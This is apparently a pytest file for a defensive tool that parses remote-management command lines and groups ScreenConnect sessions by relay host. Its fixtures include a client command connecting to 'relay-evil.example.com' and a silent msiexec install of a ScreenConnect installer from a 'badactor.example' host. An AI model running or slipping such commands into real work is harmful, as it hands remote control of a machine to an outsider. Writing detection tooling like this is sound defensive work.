from rmm_abuse_map.parse import cluster_by_relay, parse_cmdline


def test_parse_h_param():
    obs = parse_cmdline(
        'ScreenConnect.Client.exe "?e=Access&y=Guest&h=relay-evil.example.com&p=443&k=AAAA"'
    )
    assert obs.relay_host == "relay-evil.example.com"
    assert obs.relay_port == 443
    assert obs.mode == "Access"


def test_parse_bin_url():
    obs = parse_cmdline(
        'msiexec /i "https://copy-of-vm-2022.badactor.example/Bin/ScreenConnect.ClientSetup.msi" /qn'
    )
    assert obs.relay_host == "copy-of-vm-2022.badactor.example"
    assert "ScreenConnect.ClientSetup.msi" in obs.msi_names


def test_cluster():
    a = parse_cmdline("h=same.example p=443", source="a")
    b = parse_cmdline("h=same.example p=8040", source="b")
    c = parse_cmdline("h=other.example", source="c")
    clusters = cluster_by_relay([a, b, c])
    assert len(clusters["same.example"]) == 2
    assert len(clusters["other.example"]) == 1
